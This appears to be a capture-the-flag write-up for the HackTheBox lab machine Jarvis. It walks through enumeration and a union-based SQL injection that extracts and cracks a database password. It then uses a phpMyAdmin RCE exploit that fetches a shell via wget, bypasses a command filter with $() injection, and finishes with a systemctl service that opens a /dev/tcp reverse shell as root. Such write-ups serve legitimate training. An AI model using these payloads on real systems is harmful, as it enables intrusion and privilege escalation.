# HTB Medium Box Jarvis

## Enumeration Stage:

Nmap scan:
`nmap -sC -sV -A <> -o nmap`
```
# Nmap 7.92 scan initiated Thu Jun  9 00:17:50 2022 as: nmap -sC -sV -A -p22,80 -o nmap 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  9 00:17:58 2022 -- 1 IP address (1 host up) scanned in 7.89 seconds

```
nmap all port scan `nmap -p- 10.10.10.143` shows an open port on 64999 running http aswell

### Port 80
Visiting port 80 shows a link to `supersecurehotel.htb` on the page. Time to add that to /etc/hosts file
After clicking around on the page, url has a cod=1 value
supersecurehotel.htb and the <ip> returns the same page
Got an email from /footer.php: `supersecurehotel@logger.htb`
Tried adding logger.htb to /etc/hosts still found nothing

gobuster scan
```
/images               (Status: 301) [Size: 329] [--> http://supersecurehotel.htb/images/]
/index.php            (Status: 200) [Size: 23628]
/nav.php              (Status: 200) [Size: 1333]
/footer.php           (Status: 200) [Size: 2237]
/css                  (Status: 301) [Size: 326] [--> http://supersecurehotel.htb/css/]
/js                   (Status: 301) [Size: 325] [--> http://supersecurehotel.htb/js/]
/fonts                (Status: 301) [Size: 328] [--> http://supersecurehotel.htb/fonts/]
/phpmyadmin           (Status: 301) [Size: 333] [--> http://supersecurehotel.htb/phpmyadmin/]
/connection.php       (Status: 200) [Size: 0]
/room.php             (Status: 302) [Size: 3024] [--> index.php]
/sass                 (Status: 301) [Size: 327] [--> http://supersecurehotel.htb/sass/]
/server-status        (Status: 403) [Size: 308]
```

### Port 64999
Visiting this webpage says the following:
```
Hey you have been banned for 90 seconds, don't be bad 
```
Gobuster scan returns nothing good so far, tried with extension .php as well
supersecurehotel.htb and the <ip:port> returns the same page

### Conclusion so far
So far the best option seems to 
1: Check out cod=1 value on the room booking page
2: bruteforce /phpmyadmin page with potential usernames such as root, supersecrethotel and logger

## Exploity exploit time

Checking out the cod=1 value and adding in a single quote **'** breaks the page. SQL INJECTION?!?

### SQL Injection

Trying out union based sqli gives a result of 7 items it queries.  
`http://supersecurehotel.htb/room.php?cod=1 union select 1,2,3,4,5,6,7`
Putting each value into quotes, it is evident which field is which value.  

We can try to extract username and pw:  
`http://supersecurehotel.htb/room.php?cod=9999 union select "1", (SELECT password FROM mysql.user), "3", "4", "5", "6", "7"`

This gives us a user and a hash
```DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0```  
https://crackstation.net/ comes in clutch with the hash  

Creds for phpmyadmin `DBadmin:imissyou`

### phpmyadmin
Logging into phpmyadmin, the version is 4.8
Searchsploit shows that this is vulnerable to rce and links to a py script `/usr/share/exploitdb/exploits/php/webapps/50457.py`  
Changing the command parameters to `wget http://10.10.14.35:8000/shell.php` has it pickup a rev shell script from my machine  
This gives us a shell as www-data

## Priv Escalation  

### www-data to pepper
Running sudo -l shows that we can run /var/www/Admin-Utilities/simpler.py as pepper
Exploring with the script and reading the source code has the following:
**Providing a -p flag calls this function**  
```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

```
Well, now all I had to do was change the previously uploaded reverse shell php script to a different port and run `$(php /var/www/html/phpmyadmin/shell.php)`  
Shell as pepper

### Pepper to root
Running `find / -type f -perm -04000 -ls 2>/dev/null`

Shows that systemctl has its SUID bit set
Following GTFO bins by creating a service connects back to attacker machine
```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.35/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
Now when we start this using systemctl, we get shell as root.